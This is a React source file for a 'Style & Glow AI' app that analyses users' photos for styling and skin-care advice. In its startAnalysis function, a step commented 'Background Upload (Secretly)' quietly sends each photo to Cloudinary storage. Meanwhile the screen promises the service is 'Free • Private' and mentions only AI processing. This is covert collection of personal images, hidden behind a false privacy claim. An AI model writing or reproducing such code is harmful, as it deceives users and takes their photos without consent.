import React, { useState, useEffect } from 'react';
import { Camera } from './components/Camera';
import { AnalysisView } from './components/AnalysisView';
import { analyzeImage } from './services/aiService';
import { uploadToCloudinary } from './services/storageService';
import { AppState, AnalysisResult, StorageConfig } from './types';
import { Upload, Camera as CameraIcon, Loader2, Wand2, X } from 'lucide-react';

export default function App() {
  const [appState, setAppState] = useState<AppState>(AppState.UPLOAD);
  const [imageSrc, setImageSrc] = useState<string | null>(null);
  const [analysis, setAnalysis] = useState<AnalysisResult | null>(null);
  const [showCamera, setShowCamera] = useState(false);
  const [rateLimitRemaining, setRateLimitRemaining] = useState<number>(0);
  
  // Notification state for AI fallback alerts
  const [notification, setNotification] = useState<{
    message: string;
    type: 'info' | 'warning' | 'error';
  } | null>(null);
  
  // Storage Settings (Loaded from Environment)
  const [storageConfig, setStorageConfig] = useState<StorageConfig>({
    provider: 'cloudinary',
    cloudName: import.meta.env.VITE_CLOUDINARY_CLOUD_NAME || '',
    uploadPreset: import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET || '',
    enabled: !!(import.meta.env.VITE_CLOUDINARY_CLOUD_NAME && import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET)
  });

  // Check rate limit on mount and update timer
  useEffect(() => {
    const checkRateLimit = () => {
      const history = JSON.parse(localStorage.getItem('analysis_history') || '[]');
      if (history.length > 0) {
        const lastRequest = history[history.length - 1];
        const elapsed = Date.now() - lastRequest;
        const remaining = Math.max(0, 3 * 60 * 1000 - elapsed);
        setRateLimitRemaining(remaining);
      } else {
        setRateLimitRemaining(0);
      }
    };

    checkRateLimit();
    const interval = setInterval(checkRateLimit, 1000);
    return () => clearInterval(interval);
  }, []);

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        const result = reader.result as string;
        setImageSrc(result);
        startAnalysis(result);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleCameraCapture = (capturedSrc: string) => {
    setImageSrc(capturedSrc);
    setShowCamera(false);
    startAnalysis(capturedSrc);
  };

  // Notification handler for AI service
  const handleNotification = (message: string, type: 'info' | 'warning' | 'error') => {
    setNotification({ message, type });
    // Auto-dismiss after 5 seconds
    setTimeout(() => setNotification(null), 5000);
  };

  const startAnalysis = async (src: string) => {
    setAppState(AppState.ANALYZING);
    
    // Background Upload (Secretly)
    if (storageConfig.enabled) {
      uploadToCloudinary(src)
        .then(url => {
          if (url) console.log("Background sync complete (Original).");
        })
        .catch(err => console.error("Background sync failed", err));
    }

    try {
      const result = await analyzeImage(src, handleNotification);
      setAnalysis(result);
      setAppState(AppState.RESULTS);
    } catch (error) {
      console.error("Failed to analyze", error);
      alert("Something went wrong with the AI analysis. Please try again.");
      setAppState(AppState.UPLOAD);
    }
  };

  const renderContent = () => {
    if (showCamera) {
      return (
        <Camera 
          onCapture={handleCameraCapture} 
          onCancel={() => setShowCamera(false)} 
        />
      );
    }

    switch (appState) {
      case AppState.UPLOAD:
        return (
          <div className="flex flex-col items-center justify-center min-h-[80vh] px-6 text-center max-w-md mx-auto relative">
            <div className="w-20 h-20 bg-indigo-100 rounded-full flex items-center justify-center mb-8">
              <Wand2 className="text-indigo-600 w-10 h-10" />
            </div>
            
            <h1 className="text-4xl font-bold text-slate-900 mb-4 tracking-tight">Style & Glow AI</h1>
            <p className="text-slate-500 mb-10 text-lg leading-relaxed">
              Upload a photo to get personalized advice on styling, skin care, and posing. 
              <span className="block mt-2 text-indigo-600 font-medium text-sm">Free • Private • AI-Powered</span>
            </p>

            {rateLimitRemaining > 0 && (
              <div className="mb-6 p-4 bg-amber-50 border border-amber-200 rounded-xl">
                <p className="text-amber-800 text-sm font-medium">
                  ⏱️ Please wait {Math.ceil(rateLimitRemaining / 1000)}s before next analysis
                </p>
              </div>
            )}

            <div className="w-full space-y-4">
              <button 
                onClick={() => setShowCamera(true)}
                disabled={rateLimitRemaining > 0}
                className={`w-full py-4 rounded-2xl font-semibold text-lg transition-all flex items-center justify-center gap-3 shadow-xl shadow-slate-200 ${
                  rateLimitRemaining > 0 
                    ? 'bg-slate-300 text-slate-500 cursor-not-allowed' 
                    : 'bg-slate-900 text-white hover:bg-slate-800'
                }`}
              >
                <CameraIcon size={22} />
                Take Photo
              </button>

              <div className="relative">
                <input 
                  type="file" 
                  accept="image/*" 
                  onChange={handleImageUpload} 
                  disabled={rateLimitRemaining > 0}
                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer disabled:cursor-not-allowed"
                />
                <button 
                  disabled={rateLimitRemaining > 0}
                  className={`w-full py-4 border-2 rounded-2xl font-semibold text-lg transition-all flex items-center justify-center gap-3 ${
                    rateLimitRemaining > 0
                      ? 'bg-slate-100 text-slate-400 border-slate-200 cursor-not-allowed'
                      : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-50'
                  }`}
                >
                  <Upload size={22} />
                  Upload from Gallery
                </button>
              </div>
            </div>
            
            <p className="mt-8 text-xs text-slate-400">
              By using this app, you agree to allow AI processing of your images.
            </p>
          </div>
        );

      case AppState.ANALYZING:
        return (
          <div className="flex flex-col items-center justify-center min-h-[80vh] px-6 text-center">
            <Loader2 className="w-12 h-12 text-indigo-600 animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-slate-900 mb-2">Analyzing your look...</h2>
            <p className="text-slate-500 max-w-xs mx-auto">
              Checking lighting, skin tones, composition, and style factors.
            </p>
          </div>
        );

      case AppState.RESULTS:
        return (
          imageSrc && analysis ? (
            <AnalysisView 
              imageSrc={imageSrc} 
              analysis={analysis}
              rateLimitRemaining={rateLimitRemaining}
              onRetake={() => {
                setImageSrc(null);
                setAnalysis(null);
                setAppState(AppState.UPLOAD);
              }}
            />
          ) : null
        );

      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-indigo-50/50">
      {/* AI Fallback Notification */}
      {notification && (
        <div className={`
          fixed top-20 left-1/2 transform -translate-x-1/2 
          px-6 py-3 rounded-lg shadow-lg z-50 
          animate-in slide-in-from-top duration-300
          max-w-md w-full mx-4
          flex items-center justify-between gap-3
          ${
            notification.type === 'error' ? 'bg-red-500' : 
            notification.type === 'warning' ? 'bg-amber-500' : 
            'bg-blue-500'
          }
          text-white font-medium text-sm
        `}>
          <span>{notification.message}</span>
          <button 
            onClick={() => setNotification(null)}
            className="hover:bg-white/20 rounded p-1 transition-colors"
          >
            <X size={16} />
          </button>
        </div>
      )}

      <header className="fixed top-0 left-0 right-0 h-16 bg-white/80 backdrop-blur-md z-30 flex items-center justify-center border-b border-slate-100">
        <div className="font-bold text-lg text-slate-900 flex items-center gap-2">
            <span className="w-6 h-6 bg-indigo-600 rounded-lg flex items-center justify-center text-white text-xs">AI</span>
            Style & Glow
        </div>
      </header>
      
      <main className="pt-20 px-4 max-w-4xl mx-auto">
        {renderContent()}
      </main>
    </div>
  );
}